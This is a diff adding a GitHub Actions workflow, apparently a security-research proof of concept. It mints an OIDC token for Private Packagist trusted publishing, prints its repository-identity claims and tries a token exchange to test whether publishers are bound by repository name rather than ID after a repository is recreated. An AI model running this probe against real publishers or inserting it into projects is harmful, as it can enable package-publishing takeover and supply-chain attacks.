@@ -1,0 +1,17 @@
+name: publish
+on: [push, workflow_dispatch]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    steps:
+      - name: repo-identity-test
+        run: |
+          mint(){ curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | python3 -c "import sys,json;print(json.load(sys.stdin)[\"value\"])"; }
+          T=$(mint "private-packagist-trusted-publishing:pkhunt-org-a")
+          echo "=== NEW OIDC CLAIMS (same name, new id) ==="
+          echo "$T" | cut -d. -f2 | python3 -c "import sys,base64,json;d=sys.stdin.read().strip();d+=\"=\"*(-len(d)%4);c=json.loads(base64.urlsafe_b64decode(d));[print(k,\"=\",c.get(k)) for k in [\"repository\",\"repository_id\",\"repository_owner_id\",\"sub\"]]"
+          echo "=== TOKEN-EXCHANGE publisher 101 after repo recreate [200=NAME-BOUND VULN / 401=ID-BOUND SECURE] ==="
+          curl -s -w "\nHTTP:%{http_code}\n" -X POST -H "Authorization: Bearer $T" "https://packagist.com/api/oidc/token-exchange/pkhunt-org-a/tptest/demo" | head -c 300
